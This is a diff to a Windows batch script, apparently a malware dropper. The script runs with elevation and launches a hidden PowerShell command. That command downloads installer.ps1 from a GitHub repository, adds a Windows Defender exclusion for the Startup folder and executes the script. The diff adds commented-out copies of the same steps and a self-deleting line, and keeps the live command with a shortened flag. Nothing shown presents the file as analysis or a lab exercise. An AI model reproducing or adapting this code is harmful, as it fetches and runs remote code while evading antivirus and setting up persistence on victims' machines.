@@ -29,8 +29,24 @@ if '%errorlevel%' NEQ '0' (
     CD /D "%~dp0"
 :--------------------------------------   
 
+@REM REM disable defender and execute downloaded script
+@REM powershell -windowstyle hidden -Command ^
+@REM "try { ^
+@REM     Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/CHEPHYTY/MK1-Ratatouille/main/files/installer.ps1' -OutFile 'installer.ps1'; ^
+@REM     Add-MpPreference -ExclusionPath '$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup'; ^
+@REM     .\installer.ps1; ^
+@REM } catch { ^
+@REM     Write-Error 'An error occurred: ' + $_.Exception.Message; ^
+@REM }"
+
+
+@REM powershell Add-MpPreference -ExclusionPath '$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup'; ./installer.ps1
+@REM REM self delete
+@REM del "%~f0"
+
+
 REM disable defender and execute downloaded script
-powershell -windowstyle hidden -Command ^
+powershell -windowstyle hidden -c ^
 "try { ^
     Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/CHEPHYTY/MK1-Ratatouille/main/files/installer.ps1' -OutFile 'installer.ps1'; ^
     Add-MpPreference -ExclusionPath '$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup'; ^
